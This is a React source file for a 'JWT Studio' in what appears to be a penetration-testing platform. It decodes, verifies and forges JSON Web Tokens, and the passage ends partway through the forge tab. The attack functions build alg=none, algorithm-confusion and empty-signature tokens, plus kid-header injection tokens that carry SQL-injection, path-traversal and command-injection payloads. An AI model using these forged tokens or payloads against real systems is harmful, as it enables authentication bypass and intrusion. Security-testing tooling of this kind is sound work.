import { useState, useEffect, useRef, useCallback, useMemo } from 'react';
import {
  Box, Flex, Text, Heading, Button, IconButton, Input, Select, Textarea,
  Spinner, Tooltip, useToast,
  Modal, ModalOverlay, ModalContent, ModalBody, ModalFooter,
} from '@chakra-ui/react';
import { motion, AnimatePresence } from 'framer-motion';
import {
  CopyIcon, CheckIcon, DeleteIcon, RepeatIcon, WarningTwoIcon,
  AddIcon, LockIcon, UnlockIcon, TimeIcon,
} from '@chakra-ui/icons';
import { useParams } from 'react-router-dom';
import { useEngagements } from '../../../contexts/EngagementContext';

const MotionBox = motion(Box);

// ── Theme ──────────────────────────────────────────────────────────────────────
const ACCENT  = '#10B981';                     // emerald — auth / crypto / decoded
const A_S     = 'rgba(16,185,129,0.07)';
const A_B     = 'rgba(16,185,129,0.32)';
const GREEN   = '#34D399';
const RED     = '#FC8181';
const ORANGE  = '#F6AD55';
const BLUE    = '#63B3ED';
const VIOLET  = '#B794F4';
const GOLD    = '#ECC94B';
const CYAN    = '#76E4F7';
const MUTED   = 'var(--dash-text-muted)';
const CARD_BG = 'var(--dash-card-bg)';
const CARD_BD = 'var(--dash-card-border)';

const SEV_META = {
  critical: { color: RED,    label: 'Critical', icon: '⚠' },
  high:     { color: ORANGE, label: 'High',     icon: '!'  },
  medium:   { color: GOLD,   label: 'Medium',   icon: '!'  },
  low:      { color: BLUE,   label: 'Low',      icon: 'i'  },
  info:     { color: MUTED,  label: 'Info',     icon: 'i'  },
};

const tok = () => localStorage.getItem('token') || '';

// ── Base64URL & WebCrypto helpers ──────────────────────────────────────────────
const enc = new TextEncoder();
const dec = new TextDecoder();

const b64u = {
  encodeBytes: (bytes) => {
    let bin = '';
    for (let i = 0; i < bytes.length; i++) bin += String.fromCharCode(bytes[i]);
    return btoa(bin).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
  },
  encode: (str) => b64u.encodeBytes(enc.encode(str)),
  decodeBytes: (s) => {
    const padded = s.replace(/-/g, '+').replace(/_/g, '/')
      .padEnd(s.length + (4 - s.length % 4) % 4, '=');
    const bin = atob(padded);
    const bytes = new Uint8Array(bin.length);
    for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
    return bytes;
  },
  decode: (s) => {
    try { return dec.decode(b64u.decodeBytes(s)); } catch { return ''; }
  },
};

const algoHash = (alg) => /512$/.test(alg) ? 'SHA-512' : /384$/.test(alg) ? 'SHA-384' : 'SHA-256';

async function hmacSign(secret, message, hash) {
  const key = await crypto.subtle.importKey(
    'raw', enc.encode(secret),
    { name: 'HMAC', hash }, false, ['sign']
  );
  const sig = await crypto.subtle.sign('HMAC', key, enc.encode(message));
  return b64u.encodeBytes(new Uint8Array(sig));
}

async function hmacSignBytes(secretBytes, message, hash) {
  const key = await crypto.subtle.importKey(
    'raw', secretBytes,
    { name: 'HMAC', hash }, false, ['sign']
  );
  const sig = await crypto.subtle.sign('HMAC', key, enc.encode(message));
  return b64u.encodeBytes(new Uint8Array(sig));
}

async function hmacVerify(secret, message, signatureB64u, hash) {
  try {
    const key = await crypto.subtle.importKey(
      'raw', enc.encode(secret),
      { name: 'HMAC', hash }, false, ['verify']
    );
    return await crypto.subtle.verify(
      'HMAC', key, b64u.decodeBytes(signatureB64u), enc.encode(message)
    );
  } catch { return false; }
}

// PEM → DER bytes (for RS verify)
function pemToDer(pem) {
  const b64 = pem.replace(/-----[^-]+-----/g, '').replace(/\s/g, '');
  const bin = atob(b64);
  const bytes = new Uint8Array(bin.length);
  for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
  return bytes;
}

async function rsaVerify(pem, message, signatureB64u, hash) {
  try {
    const key = await crypto.subtle.importKey(
      'spki', pemToDer(pem),
      { name: 'RSASSA-PKCS1-v1_5', hash }, false, ['verify']
    );
    return await crypto.subtle.verify(
      'RSASSA-PKCS1-v1_5', key, b64u.decodeBytes(signatureB64u), enc.encode(message)
    );
  } catch { return false; }
}

// ── JWT decode + warnings ─────────────────────────────────────────────────────
function decodeJWT(rawToken) {
  const t = (rawToken || '').trim();
  if (!t) return null;
  const parts = t.split('.');
  if (parts.length < 2 || parts.length > 3) {
    throw new Error('Invalid JWT — expected 3 parts separated by "."');
  }
  let header, payload;
  try { header  = JSON.parse(b64u.decode(parts[0])); } catch { throw new Error('Invalid header'); }
  try { payload = JSON.parse(b64u.decode(parts[1])); } catch { throw new Error('Invalid payload'); }
  return {
    header, payload,
    signature: parts[2] || '',
    signingInput: `${parts[0]}.${parts[1]}`,
    parts,
  };
}

function analyzeJWT(header, payload) {
  const warnings = [];
  const now = Math.floor(Date.now() / 1000);

  const alg = String(header?.alg || '');
  if (!alg) {
    warnings.push({ severity: 'high', code: 'no_alg', message: 'No "alg" header set' });
  } else if (alg.toLowerCase() === 'none') {
    warnings.push({ severity: 'critical', code: 'alg_none',
      message: 'Algorithm "none" — signature is not verified by the server' });
  } else if (/^HS\d/i.test(alg)) {
    warnings.push({ severity: 'info', code: 'hmac',
      message: 'HMAC-based — try cracking the secret with rockyou or a custom wordlist' });
  } else if (/^RS\d/i.test(alg)) {
    warnings.push({ severity: 'info', code: 'rsa',
      message: 'RSA-based — try alg confusion attack (sign HS256 using the public key as secret)' });
  } else if (/^ES\d/i.test(alg)) {
    warnings.push({ severity: 'info', code: 'ecdsa',
      message: 'ECDSA — vulnerable to nonce reuse if implementation flawed' });
  }

  if (header?.kid && /[\/\\<>${}#"'`]|\.\./.test(String(header.kid))) {
    warnings.push({ severity: 'high', code: 'kid_inj',
      message: '"kid" contains suspicious characters — try SQLi / path traversal injection' });
  }
  if (header?.jku) {
    warnings.push({ severity: 'high', code: 'jku',
      message: '"jku" header present — try injecting your own JWK URL via header manipulation' });
  }
  if (header?.x5u) {
    warnings.push({ severity: 'high', code: 'x5u',
      message: '"x5u" header present — try X.509 URL injection' });
  }
  if (header?.jwk) {
    warnings.push({ severity: 'critical', code: 'jwk_embedded',
      message: '"jwk" embedded in header — server may trust it; sign with your own key' });
  }

  if (typeof payload?.exp === 'number') {
    if (payload.exp < now) {
      const mins = Math.round((now - payload.exp) / 60);
      warnings.push({ severity: 'high', code: 'expired',
        message: `Token expired ${mins < 60 ? mins + 'm' : Math.round(mins / 60) + 'h'} ago` });
    }
  } else {
    warnings.push({ severity: 'medium', code: 'no_exp',
      message: 'No "exp" claim — token may never expire on the server' });
  }
  if (typeof payload?.nbf === 'number' && payload.nbf > now + 60) {
    warnings.push({ severity: 'medium', code: 'nbf_future',
      message: '"nbf" in the future — token not yet valid' });
  }
  if (typeof payload?.iat === 'number' && payload.iat > now + 300) {
    warnings.push({ severity: 'medium', code: 'iat_future',
      message: '"iat" timestamp is in the future' });
  }
  if (!payload?.aud) {
    warnings.push({ severity: 'low', code: 'no_aud',
      message: 'No "aud" claim — server may not validate audience' });
  }

  return warnings;
}

// ── Helpers ────────────────────────────────────────────────────────────────────
const fmtTimestamp = (ts) => {
  if (typeof ts !== 'number') return '';
  const d = new Date(ts * 1000);
  return d.toLocaleString();
};
const relTimestamp = (ts) => {
  if (typeof ts !== 'number') return '';
  const diff = ts - Math.floor(Date.now() / 1000);
  const abs = Math.abs(diff);
  const unit = abs < 60 ? `${abs}s`
            : abs < 3600 ? `${Math.round(abs/60)}m`
            : abs < 86400 ? `${Math.round(abs/3600)}h`
            :              `${Math.round(abs/86400)}d`;
  return diff < 0 ? `${unit} ago` : `in ${unit}`;
};
const fmtRelative = (d) => {
  if (!d) return '';
  const s = (Date.now() - new Date(d)) / 1000;
  if (s < 60)    return 'just now';
  if (s < 3600)  return `${Math.floor(s / 60)}m ago`;
  if (s < 86400) return `${Math.floor(s / 3600)}h ago`;
  return `${Math.floor(s / 86400)}d ago`;
};

// ── Copy Button ────────────────────────────────────────────────────────────────
const CopyBtn = ({ text, label = 'Copy', size = 'xs' }) => {
  const [copied, setCopied] = useState(false);
  const copy = (e) => {
    e?.stopPropagation?.();
    if (!text) return;
    navigator.clipboard.writeText(text).then(() => {
      setCopied(true); setTimeout(() => setCopied(false), 1500);
    });
  };
  return (
    <Tooltip label={copied ? 'Copied!' : label} hasArrow fontSize="10px">
      <IconButton icon={copied ? <CheckIcon /> : <CopyIcon />} size={size}
        variant="ghost" color={copied ? GREEN : MUTED} _hover={{ color: 'white' }}
        onClick={copy} aria-label="copy" />
    </Tooltip>
  );
};

// ── Pretty JSON renderer with claim highlighting ──────────────────────────────
const KNOWN_CLAIMS = {
  iss:  { color: VIOLET, label: 'Issuer'        },
  sub:  { color: BLUE,   label: 'Subject'       },
  aud:  { color: CYAN,   label: 'Audience'      },
  exp:  { color: ORANGE, label: 'Expiration'    },
  nbf:  { color: GOLD,   label: 'Not Before'    },
  iat:  { color: GREEN,  label: 'Issued At'     },
  jti:  { color: MUTED,  label: 'JWT ID'        },
  scope:{ color: ACCENT, label: 'Scope'         },
  roles:{ color: VIOLET, label: 'Roles'         },
  email:{ color: CYAN,   label: 'Email'         },
  name: { color: CYAN,   label: 'Name'          },
  azp:  { color: VIOLET, label: 'Authorized Party' },
  alg:  { color: ORANGE, label: 'Algorithm'     },
  typ:  { color: MUTED,  label: 'Type'          },
  kid:  { color: GOLD,   label: 'Key ID'        },
  jku:  { color: RED,    label: 'JWK URL'       },
  x5u:  { color: RED,    label: 'X.509 URL'     },
  jwk:  { color: RED,    label: 'Embedded JWK'  },
};

const ClaimRow = ({ k, v, isHeader }) => {
  const meta = KNOWN_CLAIMS[k];
  const isTimestamp = ['exp', 'nbf', 'iat', 'auth_time'].includes(k) && typeof v === 'number';
  const isExpired = k === 'exp' && typeof v === 'number' && v < Math.floor(Date.now() / 1000);

  return (
    <Flex align="flex-start" gap={3} px={4} py="9px"
      borderBottom={`1px solid ${CARD_BD}`}
      _hover={{ bg: 'rgba(255,255,255,0.02)' }}>
      <Box flex="0 0 130px" minW={0}>
        <Flex align="center" gap={1.5}>
          <Text fontSize="11px" fontFamily="mono" fontWeight="bold"
            color={meta?.color || 'var(--dash-text-primary)'} noOfLines={1}>
            {k}
          </Text>
        </Flex>
        {meta?.label && (
          <Text fontSize="9px" color={MUTED} mt="1px">{meta.label}</Text>
        )}
      </Box>
      <Box flex={1} minW={0}>
        <Text fontSize="11px" fontFamily="mono"
          color={isExpired ? RED : 'var(--dash-text-primary)'}
          wordBreak="break-all" lineHeight={1.5}>
          {typeof v === 'object' ? JSON.stringify(v) : String(v)}
        </Text>
        {isTimestamp && (
          <Flex align="center" gap={2} mt={1}>
            <Text fontSize="10px" color={MUTED} fontFamily="mono">
              {fmtTimestamp(v)}
            </Text>
            <Text fontSize="10px" color={isExpired ? RED : ACCENT} fontWeight="bold">
              · {relTimestamp(v)}
            </Text>
          </Flex>
        )}
      </Box>
      <CopyBtn text={typeof v === 'object' ? JSON.stringify(v) : String(v)} />
    </Flex>
  );
};

const ClaimsTable = ({ obj, label, color }) => {
  const entries = Object.entries(obj || {});
  return (
    <Box borderRadius="11px" bg={CARD_BG} border={`1px solid ${CARD_BD}`}
      overflow="hidden" pos="relative">
      <Box pos="absolute" top={0} left={0} right={0} h="2px"
        style={{ background: `linear-gradient(to right, transparent, ${color}90, transparent)` }} />
      <Flex align="center" gap={2} px={4} py="10px"
        borderBottom={`1px solid ${CARD_BD}`}>
        <Box w="3px" h="13px" borderRadius="full" bg={color} />
        <Text fontSize="10px" fontWeight="bold" color={MUTED}
          textTransform="uppercase" letterSpacing="wider">{label}</Text>
        <Box px="6px" py="1px" borderRadius="full"
          bg={`${color}10`} border={`1px solid ${color}28`}>
          <Text fontSize="9px" fontWeight="bold" color={color}>
            {entries.length}
          </Text>
        </Box>
        <Box flex={1} />
        <CopyBtn text={JSON.stringify(obj, null, 2)} label="Copy JSON" />
      </Flex>
      {entries.length === 0 ? (
        <Flex align="center" justify="center" py={6}>
          <Text fontSize="11px" color={MUTED} opacity={0.5} fontStyle="italic">
            empty
          </Text>
        </Flex>
      ) : (
        entries.map(([k, v]) => <ClaimRow key={k} k={k} v={v} />)
      )}
    </Box>
  );
};

// ── Main View ──────────────────────────────────────────────────────────────────
const JWTStudioView = () => {
  const { slug }      = useParams();
  const { getBySlug } = useEngagements();
  const eng           = getBySlug(slug);
  const engId         = eng?._id;
  const toast         = useToast();

  const [tab,        setTab]       = useState('decode');
  const [rawToken,   setRawToken]  = useState('');
  const [decoded,    setDecoded]   = useState(null);
  const [parseError, setParseErr]  = useState('');

  // Forge state
  const [forgeHeader,  setForgeHeader]  = useState('');
  const [forgePayload, setForgePayload] = useState('');
  const [forgeAlg,     setForgeAlg]     = useState('HS256');
  const [forgeSecret,  setForgeSecret]  = useState('');
  const [forgedToken,  setForgedToken]  = useState('');
  const [forging,      setForging]      = useState(false);

  // Validate state
  const [verifySecret, setVerifySecret] = useState('');
  const [verifyResult, setVerifyResult] = useState(null);  // null | 'valid' | 'invalid' | 'unsupported'
  const [verifying,    setVerifying]    = useState(false);

  // Attack state — alg confusion
  const [attackPubKey, setAttackPubKey] = useState('');
  const [attackOutput, setAttackOutput] = useState('');

  // History
  const [history,    setHistory]     = useState([]);
  const [savingHist, setSavingHist]  = useState(false);

  // ── Decode on rawToken change ────────────────────────────────────────────────
  useEffect(() => {
    setParseErr('');
    if (!rawToken.trim()) { setDecoded(null); return; }
    try {
      const d = decodeJWT(rawToken);
      setDecoded(d);
      // Pre-populate forge editors
      setForgeHeader(JSON.stringify(d.header, null, 2));
      setForgePayload(JSON.stringify(d.payload, null, 2));
      setForgeAlg(d.header.alg && /^HS|^RS|^ES|none/i.test(d.header.alg) ? d.header.alg : 'HS256');
    } catch (e) {
      setDecoded(null);
      setParseErr(e.message);
    }
  }, [rawToken]);

  const warnings = useMemo(() =>
    decoded ? analyzeJWT(decoded.header, decoded.payload) : [],
    [decoded]
  );

  // ── History fetch ────────────────────────────────────────────────────────────
  const fetchHistory = useCallback(async () => {
    if (!engId) return;
    try {
      const r = await fetch(`/api/jwt-studio/${engId}/analyses`, {
        headers: { Authorization: `Bearer ${tok()}` },
      });
      if (r.ok) setHistory(await r.json());
    } catch (_) {}
  }, [engId]);

  useEffect(() => { fetchHistory(); }, [fetchHistory]);

  const saveToHistory = async () => {
    if (!decoded) return;
    setSavingHist(true);
    try {
      const r = await fetch(`/api/jwt-studio/${engId}/analyses`, {
        method: 'POST',
        headers: { Authorization: `Bearer ${tok()}`, 'Content-Type': 'application/json' },
        body: JSON.stringify({
          rawToken,
          header:    decoded.header,
          payload:   decoded.payload,
          algorithm: decoded.header?.alg || '',
          warnings,
        }),
      });
      if (!r.ok) throw new Error('Save failed');
      const saved = await r.json();
      setHistory(p => [saved, ...p]);
      toast({ title: 'Saved to history', status: 'success', duration: 1500, isClosable: true });
    } catch (_) {
      toast({ title: 'Save failed', status: 'error', duration: 2000, isClosable: true });
    } finally { setSavingHist(false); }
  };

  const deleteHistory = async (id) => {
    try {
      await fetch(`/api/jwt-studio/${engId}/analyses/${id}`, {
        method: 'DELETE', headers: { Authorization: `Bearer ${tok()}` },
      });
      setHistory(p => p.filter(h => h._id !== id));
    } catch (_) {}
  };

  const loadHistory = (h) => { setRawToken(h.rawToken); setTab('decode'); };

  // ── Forge ───────────────────────────────────────────────────────────────────
  const forge = async () => {
    setForging(true); setForgedToken('');
    try {
      let headerObj, payloadObj;
      try { headerObj  = JSON.parse(forgeHeader);  } catch { throw new Error('Header is not valid JSON'); }
      try { payloadObj = JSON.parse(forgePayload); } catch { throw new Error('Payload is not valid JSON'); }
      headerObj.alg = forgeAlg;

      const headerB64  = b64u.encode(JSON.stringify(headerObj));
      const payloadB64 = b64u.encode(JSON.stringify(payloadObj));
      const signingInput = `${headerB64}.${payloadB64}`;

      let sig = '';
      if (forgeAlg.toLowerCase() === 'none') {
        sig = '';
      } else if (/^HS\d/i.test(forgeAlg)) {
        sig = await hmacSign(forgeSecret, signingInput, algoHash(forgeAlg));
      } else {
        throw new Error(`${forgeAlg} forging not supported in-browser yet — use HS* or none`);
      }
      setForgedToken(`${signingInput}.${sig}`);
      toast({ title: 'Token forged', status: 'success', duration: 1500, isClosable: true });
    } catch (e) {
      toast({ title: 'Forge failed', description: e.message,
        status: 'error', duration: 3000, isClosable: true });
    } finally { setForging(false); }
  };

  // ── Verify ──────────────────────────────────────────────────────────────────
  const verify = async () => {
    if (!decoded) {
      toast({ title: 'Paste a token first', status: 'warning',
        duration: 2000, isClosable: true });
      return;
    }
    if (!verifySecret.trim()) {
      toast({ title: 'Enter a secret or PEM key', status: 'warning',
        duration: 2000, isClosable: true });
      return;
    }
    setVerifying(true); setVerifyResult(null);
    const alg = decoded.header?.alg || '';
    try {
      let ok = false;
      if (/^HS\d/i.test(alg)) {
        ok = await hmacVerify(verifySecret, decoded.signingInput, decoded.signature, algoHash(alg));
      } else if (/^RS\d/i.test(alg)) {
        ok = await rsaVerify(verifySecret, decoded.signingInput, decoded.signature, algoHash(alg));
      } else {
        setVerifyResult('unsupported');
        return;
      }
      setVerifyResult(ok ? 'valid' : 'invalid');
    } catch (_) {
      setVerifyResult('invalid');
    } finally { setVerifying(false); }
  };

  // ── Attacks ─────────────────────────────────────────────────────────────────
  const attackAlgNone = () => {
    if (!decoded) return;
    const headerObj = { ...decoded.header, alg: 'none' };
    const headerB64  = b64u.encode(JSON.stringify(headerObj));
    const payloadB64 = b64u.encode(JSON.stringify(decoded.payload));
    setAttackOutput(`${headerB64}.${payloadB64}.`);
    toast({ title: 'alg=none token built', description: 'Signature stripped',
      status: 'success', duration: 1500, isClosable: true });
  };

  const attackAlgConfusion = async () => {
    if (!decoded) {
      toast({ title: 'Paste a target token first', status: 'warning',
        duration: 2000, isClosable: true });
      return;
    }
    if (!attackPubKey.trim()) {
      toast({ title: 'Paste the RSA public key (PEM)', status: 'warning',
        duration: 2000, isClosable: true });
      return;
    }
    try {
      const headerObj = { ...decoded.header, alg: 'HS256' };
      const headerB64  = b64u.encode(JSON.stringify(headerObj));
      const payloadB64 = b64u.encode(JSON.stringify(decoded.payload));
      const signingInput = `${headerB64}.${payloadB64}`;
      // sign HS256 using the entire PEM string as the HMAC secret
      const sig = await hmacSign(attackPubKey, signingInput, 'SHA-256');
      setAttackOutput(`${signingInput}.${sig}`);
      toast({ title: 'Confusion token built',
        description: 'Signed HS256 with the public-key bytes',
        status: 'success', duration: 1800, isClosable: true });
    } catch (e) {
      toast({ title: 'Attack failed', description: e.message,
        status: 'error', duration: 3000, isClosable: true });
    }
  };

  const attackKidInjection = (variant) => {
    if (!decoded) return;
    const variants = {
      sqli:      "1' UNION SELECT 'attackerkey'-- ",
      traversal: '../../../../../../dev/null',
      cmd:       "x'; system('id'); '",
      empty:     '',
    };
    const newKid = variants[variant];
    const headerObj = { ...decoded.header, kid: newKid };
    const headerB64  = b64u.encode(JSON.stringify(headerObj));
    const payloadB64 = b64u.encode(JSON.stringify(decoded.payload));
    setAttackOutput(`${headerB64}.${payloadB64}.${decoded.signature}`);
    toast({ title: `kid=${variant}`, description: 'Token rebuilt with injected kid header',
      status: 'success', duration: 1800, isClosable: true });
  };

  const attackEmptySig = () => {
    if (!decoded) return;
    setAttackOutput(`${decoded.parts[0]}.${decoded.parts[1]}.`);
    toast({ title: 'Empty-signature token built',
      description: 'Some libs accept this when alg is HMAC-based',
      status: 'success', duration: 2000, isClosable: true });
  };

  const useAttackOutput = () => {
    if (!attackOutput) return;
    setRawToken(attackOutput);
    setTab('decode');
  };

  const clear = () => {
    setRawToken(''); setDecoded(null); setParseErr('');
    setForgeHeader(''); setForgePayload(''); setForgedToken('');
    setVerifySecret(''); setVerifyResult(null);
    setAttackPubKey(''); setAttackOutput('');
  };

  // ── Render ────────────────────────────────────────────────────────────────────
  const algBadgeColor = (alg) => {
    if (!alg) return MUTED;
    if (alg.toLowerCase() === 'none') return RED;
    if (/^HS\d/i.test(alg)) return ORANGE;
    if (/^RS\d/i.test(alg)) return BLUE;
    if (/^ES\d/i.test(alg)) return VIOLET;
    return ACCENT;
  };

  return (
    <Box>
      {/* ── Header ─────────────────────────────────────────────────────────── */}
      <Box mb={5}>
        <Heading fontSize="2xl" fontWeight="bold" color="var(--dash-text-primary)" lineHeight={1.2}>
          JWT <Text as="span" color="red.400">Studio</Text>
        </Heading>
        <Text fontSize="12px" color="var(--dash-text-secondary)" mt={1}>
          {eng?.name} · decode · forge · attack · validate · all crypto runs in-browser
        </Text>
      </Box>

      {/* ── Info banner ─────────────────────────────────────────────────────── */}
      <Box mb={5} px={4} py={3} borderRadius="10px" bg={A_S} border={`1px solid ${A_B}`}>
        <Flex align="center" gap={2} mb={1.5}>
          <LockIcon boxSize={3} color={ACCENT} />
          <Text fontSize="10px" fontWeight="bold" color={ACCENT}
            textTransform="uppercase" letterSpacing="wider">
            JSON Web Token Workbench
          </Text>
        </Flex>
        <Flex gap={5} flexWrap="wrap">
          {[
            'Paste a JWT — automatic decode, claim highlighting, security audit',
            'One-click attack templates: alg=none · alg confusion · kid injection',
            'Forge tokens with HS256/384/512 — signature computed via Web Crypto',
            'Verify HS* and RS* signatures; engagement-scoped history with operator attribution',
          ].map(t => (
            <Flex key={t} align="center" gap={1.5}>
              <Box w="4px" h="4px" borderRadius="full" bg={ACCENT} flexShrink={0} />
              <Text fontSize="11px" color={MUTED}>{t}</Text>
            </Flex>
          ))}
        </Flex>
      </Box>

      {/* ── Two-column layout ───────────────────────────────────────────────── */}
      <Flex gap={0} align="flex-start">

        {/* ── Left ──────────────────────────────────────────────────────── */}
        <Flex direction="column" flex="1" gap={4} pr={6} minW={0}>

          {/* ── Token input card ───────────────────────────────────────── */}
          <Box borderRadius="14px" bg={CARD_BG} border={`1px solid ${CARD_BD}`}
            overflow="hidden" pos="relative">
            <Box pos="absolute" top={0} left={0} right={0} h="2px"
              style={{ background: `linear-gradient(to right, transparent, ${ACCENT}70, transparent)` }} />

            <Flex align="center" gap={2} px={5} py={3}
              borderBottom={`1px solid ${CARD_BD}`}>
              <Box w="3px" h="13px" borderRadius="full" bg={ACCENT} />
              <Text fontSize="10px" fontWeight="bold" color={MUTED}
                textTransform="uppercase" letterSpacing="wider">JWT Token</Text>
              {decoded && decoded.header?.alg && (
                <Box ml={2} px="7px" py="2px" borderRadius="5px"
                  bg={`${algBadgeColor(decoded.header.alg)}14`}
                  border={`1px solid ${algBadgeColor(decoded.header.alg)}30`}>
                  <Text fontSize="9px" fontWeight="black" fontFamily="mono"
                    color={algBadgeColor(decoded.header.alg)}>
                    {decoded.header.alg}
                  </Text>
                </Box>
              )}
              <Box flex={1} />
              {decoded && (
                <Tooltip label="Save to history" hasArrow fontSize="10px">
                  <IconButton size="xs" variant="ghost" icon={<AddIcon />}
                    color={MUTED} _hover={{ color: ACCENT }}
                    isLoading={savingHist}
                    onClick={saveToHistory} aria-label="save" />
                </Tooltip>
              )}
              {rawToken && (
                <Button size="xs" variant="ghost" color={MUTED} fontSize="10px"
                  _hover={{ color: RED }} onClick={clear}>Clear</Button>
              )}
            </Flex>

            <Box p={4}>
              <Textarea
                value={rawToken}
                onChange={e => setRawToken(e.target.value)}
                fontSize="11px" fontFamily="mono"
                minH="100px" resize="vertical"
                bg="rgba(6,8,12,0.6)" border={`1px solid ${parseError ? RED : CARD_BD}`}
                color="#a8d8c8" wordBreak="break-all"
                _placeholder={{ color: MUTED, fontFamily: 'sans-serif' }}
                _focus={{ borderColor: A_B, boxShadow: `0 0 0 1px ${A_B}`, outline: 'none' }}
                placeholder="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U"
              />
              {parseError && (
                <Flex align="center" gap={2} mt={2} px={3} py={2} borderRadius="7px"
                  bg="rgba(252,129,129,0.08)" border={`1px solid ${RED}30`}>
                  <WarningTwoIcon boxSize={3} color={RED} />
                  <Text fontSize="11px" color={RED} fontFamily="mono">{parseError}</Text>
                </Flex>
              )}
              {decoded && (
                <Flex align="center" gap={2} mt={2}>
                  <Text fontSize="10px" color={MUTED}>
                    Header · {(decoded.parts[0] || '').length}b
                  </Text>
                  <Box w="3px" h="3px" borderRadius="full" bg={MUTED} />
                  <Text fontSize="10px" color={MUTED}>
                    Payload · {(decoded.parts[1] || '').length}b
                  </Text>
                  <Box w="3px" h="3px" borderRadius="full" bg={MUTED} />
                  <Text fontSize="10px" color={MUTED}>
                    Signature · {decoded.signature.length}b
                  </Text>
                </Flex>
              )}
            </Box>
          </Box>

          {/* ── Tabs nav ─────────────────────────────────────────────────── */}
          <Flex gap={1} bg={CARD_BG} borderRadius="10px"
            border={`1px solid ${CARD_BD}`} p="4px">
            {[
              { k: 'decode',   label: 'Decode',   icon: UnlockIcon },
              { k: 'forge',    label: 'Forge',    icon: AddIcon    },
              { k: 'attack',   label: 'Attack',   icon: WarningTwoIcon },
              { k: 'validate', label: 'Validate', icon: CheckIcon  },
            ].map(t => {
              const act = tab === t.k;
              const Icon = t.icon;
              return (
                <Button key={t.k} flex={1} size="sm" h="34px" borderRadius="7px"
                  fontSize="11px" fontWeight="bold"
                  bg={act ? A_S : 'transparent'}
                  color={act ? ACCENT : MUTED}
                  border={act ? `1px solid ${A_B}` : '1px solid transparent'}
                  _hover={{ color: ACCENT }}
                  leftIcon={<Icon boxSize={3} />}
                  onClick={() => setTab(t.k)}>
                  {t.label}
                </Button>
              );
            })}
          </Flex>

          {/* ── Tab content ─────────────────────────────────────────────── */}
          <AnimatePresence mode="wait">

            {/* ── DECODE TAB ─────────────────────────────────────────── */}
            {tab === 'decode' && (
              <MotionBox key="decode"
                initial={{ opacity: 0, y: 6 }} animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0 }} transition={{ duration: 0.2 }}>

                {!decoded ? (
                  <Box borderRadius="14px" bg={CARD_BG} border={`1px dashed ${CARD_BD}`}
                    py={14}>
                    <Flex direction="column" align="center" gap={3} opacity={0.45}>
                      <UnlockIcon boxSize={8} color={MUTED} />
                      <Text fontSize="13px" fontWeight="semibold" color="var(--dash-text-primary)">
                        Paste a JWT above to decode
                      </Text>
                      <Text fontSize="11px" color={MUTED}>
                        Header, payload and signature will be parsed automatically
                      </Text>
                    </Flex>
                  </Box>
                ) : (
                  <Flex direction="column" gap={3}>
                    {/* Warnings panel */}
                    {warnings.length > 0 && (
                      <Box borderRadius="11px" bg={CARD_BG} border={`1px solid ${CARD_BD}`}
                        overflow="hidden" pos="relative">
                        <Box pos="absolute" top={0} left={0} right={0} h="2px"
                          style={{ background: `linear-gradient(to right, transparent, ${RED}90, transparent)` }} />
                        <Flex align="center" gap={2} px={4} py="10px"
                          borderBottom={`1px solid ${CARD_BD}`}>
                          <WarningTwoIcon boxSize={3} color={RED} />
                          <Text fontSize="10px" fontWeight="bold" color={MUTED}
                            textTransform="uppercase" letterSpacing="wider">
                            Security Audit
                          </Text>
                          <Box px="6px" py="1px" borderRadius="full"
                            bg="rgba(252,129,129,0.1)" border={`1px solid ${RED}30`}>
                            <Text fontSize="9px" fontWeight="bold" color={RED}>
                              {warnings.length}
                            </Text>
                          </Box>
                        </Flex>
                        <Flex direction="column">
                          {warnings.map((w, i) => {
                            const meta = SEV_META[w.severity] || SEV_META.info;
                            return (
                              <Flex key={i} align="center" gap={3} px={4} py="9px"
                                borderBottom={i < warnings.length - 1 ? `1px solid ${CARD_BD}` : 'none'}>
                                <Box flex="0 0 64px">
                                  <Box px="6px" py="2px" borderRadius="4px" display="inline-block"
                                    bg={`${meta.color}14`} border={`1px solid ${meta.color}30`}>
                                    <Text fontSize="9px" fontWeight="black" color={meta.color}
                                      textTransform="uppercase" letterSpacing="wider">
                                      {meta.label}
                                    </Text>
                                  </Box>
                                </Box>
                                <Text fontSize="11px" color="var(--dash-text-secondary)" flex={1}>
                                  {w.message}
                                </Text>
                              </Flex>
                            );
                          })}
                        </Flex>
                      </Box>
                    )}

                    <ClaimsTable obj={decoded.header}  label="Header"  color={CYAN}   />
                    <ClaimsTable obj={decoded.payload} label="Payload" color={ACCENT} />

                    {/* Signature */}
                    <Box borderRadius="11px" bg={CARD_BG} border={`1px solid ${CARD_BD}`}
                      overflow="hidden" pos="relative">
                      <Box pos="absolute" top={0} left={0} right={0} h="2px"
                        style={{ background: `linear-gradient(to right, transparent, ${ORANGE}90, transparent)` }} />
                      <Flex align="center" gap={2} px={4} py="10px"
                        borderBottom={`1px solid ${CARD_BD}`}>
                        <Box w="3px" h="13px" borderRadius="full" bg={ORANGE} />
                        <Text fontSize="10px" fontWeight="bold" color={MUTED}
                          textTransform="uppercase" letterSpacing="wider">
                          Signature
                        </Text>
                        <Box flex={1} />
                        {decoded.signature && <CopyBtn text={decoded.signature} />}
                      </Flex>
                      <Box p={4}>
                        {decoded.signature ? (
                          <Text fontSize="11px" fontFamily="mono" color="#a8d8c8"
                            wordBreak="break-all" lineHeight={1.5}>
                            {decoded.signature}
                          </Text>
                        ) : (
                          <Flex align="center" gap={2}>
                            <WarningTwoIcon boxSize={3} color={RED} />
                            <Text fontSize="11px" color={RED} fontStyle="italic">
                              No signature — token is unsigned
                            </Text>
                          </Flex>
                        )}
                      </Box>
                    </Box>
                  </Flex>
                )}
              </MotionBox>
            )}

            {/* ── FORGE TAB ──────────────────────────────────────────── */}
            {tab === 'forge' && (
              <MotionBox key="forge"
                initial={{ opacity: 0, y: 6 }} animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0 }} transition={{ duration: 0.2 }}>
                <Box borderRadius="14px" bg={CARD_BG} border={`1px solid ${CARD_BD}`}
                  overflow="hidden" pos="relative">
                  <Box pos="absolute" top={0} left={0} right={0} h="2px"
                    style={{ background: `linear-gradient(to right, transparent, ${ACCENT}70, transparent)` }} />
                  <Flex align="center" gap={2} px={5} py={3}
